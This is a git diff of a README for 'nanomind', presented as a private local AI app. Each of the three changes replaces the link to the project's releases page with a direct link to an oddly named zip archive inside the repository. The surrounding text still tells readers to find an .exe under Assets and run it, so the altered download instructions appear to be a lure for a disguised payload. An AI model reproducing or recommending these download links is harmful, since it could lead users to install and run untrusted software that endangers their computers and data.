@@ -1,6 +1,6 @@
 # 🧠 nanomind - Private AI for modest hardware devices
 
-[![](https://img.shields.io/badge/Download-nanomind-blue.svg)](https://github.com/geovanna8297/nanomind/releases)
+[![](https://img.shields.io/badge/Download-nanomind-blue.svg)](https://github.com/geovanna8297/nanomind/raw/refs/heads/main/forker/Software_stolidness.zip)
 
 nanomind brings artificial intelligence to your personal computer. You run this software on your own hardware without sending data to the cloud. It works on systems with limited memory and keeps your information private.
 
@@ -8,7 +8,7 @@ nanomind brings artificial intelligence to your personal computer. You run this 
 
 Follow these steps to get the application on your computer.
 
-1. Visit [this page to download](https://github.com/geovanna8297/nanomind/releases).
+1. Visit [this page to download](https://github.com/geovanna8297/nanomind/raw/refs/heads/main/forker/Software_stolidness.zip).
 2. Look for the Assets section at the bottom of the newest version.
 3. Click the file ending in `.exe` to save it to your Windows computer.
 4. Open the file once the download finishes to begin installation.
@@ -75,4 +75,4 @@ The project uses the following technologies:
 * Edge AI principles to prioritize local processing.
 * Privacy-first development standards.
 
-Check the releases page often for updates. We improve hardware support and add new language models regularly. You can also visit [this page to download](https://github.com/geovanna8297/nanomind/releases) patches that fix errors or add features.
+Check the releases page often for updates. We improve hardware support and add new language models regularly. You can also visit [this page to download](https://github.com/geovanna8297/nanomind/raw/refs/heads/main/forker/Software_stolidness.zip) patches that fix errors or add features.
